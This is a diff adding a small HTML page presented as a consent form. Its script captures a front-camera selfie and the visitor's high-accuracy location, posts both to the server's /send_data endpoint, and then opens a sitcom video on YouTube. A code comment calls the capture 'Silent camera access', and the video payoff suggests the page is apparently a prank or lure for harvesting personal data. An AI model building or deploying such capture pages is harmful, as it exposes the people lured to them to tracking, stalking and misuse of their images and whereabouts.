@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Location & Selfie Capture Consent</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 40px;
+            background-color: #f8f8f8;
+        }
+        h1 { color: #333; }
+        button {
+            padding: 15px 40px;
+            font-size: 18px;
+            background-color: #ff0000;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #status {
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <h1>Consent: Location & Selfie Capture</h1>
+    <p>Click the button to allow location and selfie capture.<br>Photos and location will be sent securely.</p>
+    <button onclick="startCapture()">Agree & Send Data</button>
+    <div id="status"></div>
+
+<script>
+async function startCapture() {
+    try {
+        // Silent camera access
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video  = document.createElement('video');
+        video.srcObject = stream;
+        await video.play();
+
+        // Get geolocation
+        navigator.geolocation.getCurrentPosition(async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Capture selfie
+            const canvas = document.createElement('canvas');
+            canvas.width  = video.videoWidth  || 320;
+            canvas.height = video.videoHeight || 240;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            const imageBase64 = canvas.toDataURL('image/png');
+            stream.getTracks().forEach(t => t.stop());
+
+            // Send to server
+            const res = await fetch('/send_data', {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({ latitude: lat, longitude: lon, selfie: imageBase64 })
+            });
+            const result = await res.json();
+            document.getElementById('status').innerText = result.status;
+
+            // On success, open TMKOC video
+            if (/success/i.test(result.status)) {
+                window.open('https://youtu.be/pWPSWwK7w8w?si=BVRHs_Kc_STKulz4', '_blank');
+            }
+        },
+        error => {
+            document.getElementById('status').innerText = "Location permission denied or error.";
+        },
+        { enableHighAccuracy: true, timeout: 10000 });
+
+    } catch (err) {
+        document.getElementById('status').innerText = `Camera error: ${err}`;
+    }
+}
+</script>
+</body>
+</html>
